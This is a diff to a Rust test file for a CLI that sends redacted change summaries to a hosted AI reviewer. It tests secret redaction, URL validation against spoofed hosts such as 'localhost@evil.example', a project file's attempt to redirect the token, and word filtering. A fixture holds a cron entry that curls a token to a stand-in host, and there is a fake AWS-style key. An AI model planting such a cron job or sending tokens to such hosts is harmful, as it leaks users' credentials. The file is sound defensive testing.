@@ -69,9 +69,15 @@ fn diff_document() -> Value {
     json!({
         "format": 2,
         "home": "/home/dev",
-        "summary": [{"bucket": "code", "lines": ["~/app: 1 file changed"]}],
-        "code": [{"repo": "/home/dev/app", "dirty_new": {"run.sh": "M"}}],
+        "summary": [{"bucket": "not kept", "lines": ["Not kept: credentials: ~/.ssh/id_ed25519 (gitignored)"]}],
+        "code": [{"repo": "/home/dev/app", "commits": ["abc", "def"],
+                  "dirty_new": {"run.sh": "M", "deploy.key": "??", ".env.local": "??"},
+                  "renamed_from": {"keys/new.pem": "old.txt"},
+                  "dirty_identity": {"run.sh": {"kind": "file", "size": "12", "hash": "HASH1"}},
+                  "gitignored": [{"path": ".env", "change": "modified",
+                                  "after": {"kind": "file", "size": "9", "hash": "HASH2"}}]}],
         "packages": [{"manager": "apt", "added": {"jq": "1.7"},
+                      "owned_files": {"jq": ["/usr/bin/jq", "/usr/bin/a", "/usr/bin/b", "/usr/bin/c", "/usr/bin/d", "/usr/bin/e", "/usr/bin/f"]},
                       "owned_changes": {"jq": [{"path": "/usr/bin/jq"}]}}],
         "settings": {
             "files": [{"path": "/home/dev/.aws/credentials", "change": "modified"},
@@ -79,7 +85,9 @@ fn diff_document() -> Value {
             "cron": [{"user": "dev", "change": "added", "after": "* * * * * curl http://x/TOKEN123"}],
             "services": [], "launch_agents": []
         },
-        "database": [], "other": [],
+        "database": [{"engine": "sqlite", "name": "/home/dev/app/db.sqlite3", "change": "modified",
+                      "digest": ["DIGESTA", "DIGESTB"], "tables": []}],
+        "other": [],
         "idle_noise": [{"path": "/home/dev/noise"}],
         "not_kept": {"listening": [], "processes": [], "services": [],
                      "credentials": {"~/.ssh/": ["~/.ssh/id_ed25519"]},
@@ -97,10 +105,15 @@ fn engine() -> FakeEngine {
         "operations.job.get" => Ok(json!({"jobId": "job:1", "state": "finished", "outcome": {
             "result": {"diff": diff_document(), "text": "a text", "reviewDigest": "d1",
                        "request": {"id": "fr-ab12cd34", "target": "id-main"}, "forkName": "try"}}})),
+        "guest.exec" => Ok(
+            json!({"exitCode": 0, "stderr": [], "stdout": CODE_DIFF.bytes().collect::<Vec<u8>>()}),
+        ),
         "operations.job.acknowledge" => Ok(Value::Null),
         other => Err(("internal", format!("unexpected {other}"))),
     })
 }
+
+const CODE_DIFF: &str = "diff --git a/run.sh b/run.sh\n--- a/run.sh\n+++ b/run.sh\n@@ -1 +1 @@\n-echo old\n+echo new KEY=AKIAABCDEFGHIJKLMNOP\ndiff --git a/.env b/.env\n+++ b/.env\n+SECRETVALUE=1\n";
 
 async fn run_cli(engine: &FakeEngine, args: &[&str]) -> Result<i32, String> {
     let socket = engine.socket.to_str().unwrap();
@@ -112,6 +125,16 @@ async fn run_cli(engine: &FakeEngine, args: &[&str]) -> Result<i32, String> {
         .map_err(|error| error.message)
 }
 
+fn home_with(reviewer_yaml: Option<&str>) -> tempfile::TempDir {
+    let home = tempfile::tempdir().unwrap();
+    if let Some(yaml) = reviewer_yaml {
+        std::fs::create_dir_all(home.path().join(".config/silo")).unwrap();
+        std::fs::write(home.path().join(".config/silo/reviewer.yaml"), yaml).unwrap();
+    }
+    std::env::set_var("HOME", home.path());
+    home
+}
+
 fn configure(url: Option<&str>) {
     match url {
         Some(url) => std::env::set_var("SILO_REVIEWER_URL", url),
@@ -121,7 +144,7 @@ fn configure(url: Option<&str>) {
 }
 
 fn forbidden(index: usize) -> String {
-    hosted::filter::words()[index].clone()
+    [["sa", "fe"], ["se", "cure"]][index.min(1)].concat()
 }
 
 #[tokio::test]
@@ -137,6 +160,7 @@ async fn sends_only_the_diff_and_renders_the_answer_under_the_banner() {
             "code": {"summary": "Code.", "findings": []}
         }}),
     );
+    let _home = home_with(None);
     configure(Some(&service.url));
     let engine = engine();
     assert_eq!(run_cli(&engine, &["review", "try"]).await, Ok(0));
@@ -155,11 +179,35 @@ async fn sends_only_the_diff_and_renders_the_answer_under_the_banner() {
         "reviewDigest",
         "\"home\"",
         "/home/dev",
+        "Not kept",
+        "(gitignored)",
+        "deploy.key",
+        ".env",
+        "new.pem",
+        "HASH1",
+        "HASH2",
+        "DIGESTA",
+        "SECRETVALUE",
+        "AKIAABCDEFGHIJKLMNOP",
+        "\"summary\"",
+        "/usr/bin/f",
     ] {
         assert!(!sent.contains(left_out), "{left_out} was sent: {sent}");
     }
     assert!(sent.contains("~/.bashrc"), "{sent}");
     assert!(sent.contains("run.sh") && sent.contains("\"jq\""));
+    assert!(body["diff"]["code_diff"]
+        .as_str()
+        .unwrap()
+        .contains("+echo new KEY=[redacted]"));
+    assert_eq!(body["diff"]["packages"][0]["owned_files"]["jq"]["count"], 7);
+    assert_eq!(engine.calls("guest.exec").len(), 1);
+    let script = engine.calls("guest.exec")[0]["argv"][2]
+        .as_str()
+        .unwrap()
+        .to_owned();
+    assert!(script.contains("--no-textconv") && script.contains("\"$2..HEAD\""));
+    assert_eq!(engine.calls("guest.exec")[0]["argv"][5], "abc");
 }
 
 #[tokio::test]
@@ -189,12 +237,16 @@ async fn the_answer_is_filtered_and_the_count_is_reported() {
         &["code".to_owned()],
     );
     assert_eq!(shaped["filtered"], 2);
-    assert_eq!(shaped["lenses"]["code"]["summary"], "Reads a file. Done.");
+    assert_eq!(
+        shaped["lenses"]["code"]["summary"],
+        "Reads a file. It is [wording removed]. Done."
+    );
     assert_eq!(shaped["lenses"]["code"]["findings"][0]["severity"], "info");
     let text = hosted::render(&shaped);
     assert!(text.starts_with(hosted::BANNER));
     assert!(text.contains("2 word(s)"));
     assert!(!text.to_lowercase().contains(&word));
+    assert!(text.contains("[wording removed]"));
 }
 
 #[tokio::test]
@@ -221,6 +273,19 @@ async fn it_is_off_until_configured_and_errors_are_clear() {
     configure(Some("http://example.com"));
     let plain = run_cli(&engine, &["review", "try"]).await.unwrap_err();
     assert!(plain.contains("https://"));
+    for bad in [
+        "http://localhost.evil.example",
+        "http://localhost@evil.example",
+        "https://user:pw@example.com",
+        "http://127.0.0.1.evil.example/x",
+        "ftp://localhost",
+    ] {
+        configure(Some(bad));
+        assert!(run_cli(&engine, &["review", "try"]).await.is_err(), "{bad}");
+    }
+    assert!(hosted::check_url("http://localhost:8080").is_ok());
+    assert!(hosted::check_url("http://[::1]:8080/x").is_ok());
+    assert!(hosted::check_url("https://reviewer.example.com").is_ok());
     let service = mock(401, json!({"error": "no"}));
     configure(Some(&service.url));
     let denied = run_cli(&engine, &["review", "try"]).await.unwrap_err();
@@ -233,6 +298,34 @@ async fn it_is_off_until_configured_and_errors_are_clear() {
 }
 
 #[tokio::test]
+async fn a_project_file_cannot_choose_where_the_token_goes() {
+    let _guard = ENV.lock().unwrap_or_else(|e| e.into_inner());
+    let service = mock(200, json!({"lenses": {}}));
+    let _home = home_with(None);
+    configure(None);
+    let settings =
+        silo_cli::config::parse_settings("reviewer:\n  url: https://evil.example\n").unwrap();
+    let error = hosted::Reviewer::resolve(Some(&settings)).unwrap_err();
+    assert!(error.message.contains("reviewer is off") && error.message.contains("ignored"));
+    // The same address as the trusted one is accepted without a note.
+    configure(Some(&service.url));
+    let same =
+        silo_cli::config::parse_settings(&format!("reviewer:\n  url: {}\n", service.url)).unwrap();
+    let reviewer = hosted::Reviewer::resolve(Some(&same)).unwrap();
+    assert!(reviewer.notes.is_empty());
+    // A different project URL is ignored with a note, and the trusted one is used.
+    let other =
+        silo_cli::config::parse_settings("reviewer:\n  url: https://evil.example\n").unwrap();
+    let reviewer = hosted::Reviewer::resolve(Some(&other)).unwrap();
+    assert_eq!(reviewer.url, service.url);
+    assert_eq!(reviewer.notes.len(), 1);
+    // The user-level file works without the variable.
+    let _home = home_with(Some(&format!("url: {}\n", service.url)));
+    std::env::remove_var("SILO_REVIEWER_URL");
+    assert_eq!(hosted::Reviewer::resolve(None).unwrap().url, service.url);
+}
+
+#[tokio::test]
 async fn a_diff_over_the_size_cap_is_not_sent() {
     let _guard = ENV.lock().unwrap_or_else(|e| e.into_inner());
     let service = mock(200, json!({"lenses": {}}));
@@ -241,8 +334,8 @@ async fn a_diff_over_the_size_cap_is_not_sent() {
         "computers.list" => Ok(listing(&[("try", "running")])),
         "changes.diff" => Ok(json!({"jobId": "job:1"})),
         "operations.job.get" => Ok(json!({"jobId": "job:1", "state": "finished", "outcome": {
-            "result": {"diff": {"format": 2, "summary": [
-                {"bucket": "code", "lines": ["x".repeat(hosted::MAX_REQUEST_BYTES)]}]}}}})),
+            "result": {"diff": {"format": 2, "other": [
+                {"path": "x".repeat(hosted::MAX_REQUEST_BYTES), "change": "added"}]}}}})),
         "operations.job.acknowledge" => Ok(Value::Null),
         other => Err(("internal", format!("unexpected {other}"))),
     });
@@ -284,8 +377,20 @@ fn start_service(port: u16) -> Option<Service> {
         let _ = child.wait();
         return None;
     }
-    std::thread::sleep(std::time::Duration::from_millis(800));
-    Some(Service(child))
+    let service = Service(child);
+    for _ in 0..100 {
+        let up = std::net::TcpStream::connect(("127.0.0.1", port)).and_then(|mut stream| {
+            stream.write_all(b"GET /healthz HTTP/1.0\r\n\r\n")?;
+            let mut reply = String::new();
+            stream.read_to_string(&mut reply)?;
+            Ok(reply.contains("200"))
+        });
+        if up.unwrap_or(false) {
+            return Some(service);
+        }
+        std::thread::sleep(std::time::Duration::from_millis(50));
+    }
+    None
 }
 
 #[tokio::test]
@@ -297,6 +402,10 @@ async fn the_cli_reviews_through_the_real_service_with_a_fake_llm() {
         .unwrap()
         .port();
     let Some(service) = start_service(port) else {
+        assert!(
+            std::env::var("SILO_REVIEWER_E2E_REQUIRED").is_err(),
+            "the reviewer service did not start"
+        );
         eprintln!("skipped: python3 lacks the reviewer service's dependencies");
         return;
     };
@@ -320,4 +429,94 @@ async fn the_cli_reviews_through_the_real_service_with_a_fake_llm() {
     );
     assert_eq!(value["filtered"], 0);
     drop(service);
+}
+
+#[tokio::test]
+async fn requests_show_review_json_sends_the_chosen_lens() {
+    let _guard = ENV.lock().unwrap_or_else(|e| e.into_inner());
+    let service = mock(
+        200,
+        json!({"lenses": {"packages": {"summary": "One package.", "findings": []}}}),
+    );
+    let _home = home_with(None);
+    configure(Some(&service.url));
+    let engine = engine();
+    let args = [
+        "requests",
+        "show",
+        "fr-ab12cd34",
+        "--review",
+        "--lens",
+        "packages",
+        "--json",
+    ];
+    assert_eq!(run_cli(&engine, &args).await, Ok(0));
+    let seen = service.seen.lock().unwrap();
+    assert_eq!(seen[0].1["lenses"], json!(["packages"]));
+    // Only the package lens was asked for, so no code text was read from the computer.
+    assert!(engine.calls("guest.exec").is_empty());
+    assert!(seen[0].1["diff"].get("code_diff").is_none());
+}
+
+#[tokio::test]
+async fn the_mcp_review_tool_returns_the_shaped_review() {
+    use rmcp::ServiceExt;
+    use tokio::io::{AsyncBufReadExt, AsyncWriteExt};
+    let _guard = ENV.lock().unwrap_or_else(|e| e.into_inner());
+    let word = forbidden(0);
+    let service = mock(
+        200,
+        json!({"lenses": {"packages": {"summary": format!("It is {word}."), "findings": []}}}),
+    );
+    let _home = home_with(None);
+    configure(Some(&service.url));
+    let engine = engine();
+    let (server_side, client_side) = tokio::io::duplex(64 * 1024);
+    let (server_read, server_write) = tokio::io::split(server_side);
+    let server = silo_cli::mcp::SiloMcp::new(engine.socket.clone(), std::env::temp_dir());
+    tokio::spawn(async move {
+        let running = server.serve((server_read, server_write)).await.unwrap();
+        let _ = running.waiting().await;
+    });
+    let (read, mut write) = tokio::io::split(client_side);
+    let mut read = tokio::io::BufReader::new(read);
+    let ask = |id: u64, method: &str, params: Value| {
+        format!(
+            "{}\n",
+            json!({"jsonrpc": "2.0", "id": id, "method": method, "params": params})
+        )
+    };
+    let init = json!({"protocolVersion": "2025-06-18", "capabilities": {},
+                      "clientInfo": {"name": "test", "version": "0"}});
+    write
+        .write_all(ask(1, "initialize", init).as_bytes())
+        .await
+        .unwrap();
+    let mut line = String::new();
+    read.read_line(&mut line).await.unwrap();
+    write
+        .write_all(b"{\"jsonrpc\":\"2.0\",\"method\":\"notifications/initialized\"}\n")
+        .await
+        .unwrap();
+    let call = json!({"name": "review", "arguments": {"target": "try", "lens": "packages"}});
+    write
+        .write_all(ask(2, "tools/call", call).as_bytes())
+        .await
+        .unwrap();
+    line.clear();
+    read.read_line(&mut line).await.unwrap();
+    let reply: Value = serde_json::from_str(&line).unwrap();
+    assert_ne!(reply["result"]["isError"], true, "{reply}");
+    let text = reply["result"]["content"][0]["text"].as_str().unwrap();
+    let value: Value = serde_json::from_str(text).unwrap();
+    assert_eq!(value["advisory"], hosted::BANNER);
+    assert_eq!(value["filtered"], 1);
+    assert_eq!(
+        value["lenses"]["packages"]["summary"],
+        "It is [wording removed]."
+    );
+    assert_eq!(
+        service.seen.lock().unwrap()[0].1["lenses"],
+        json!(["packages"])
+    );
 }
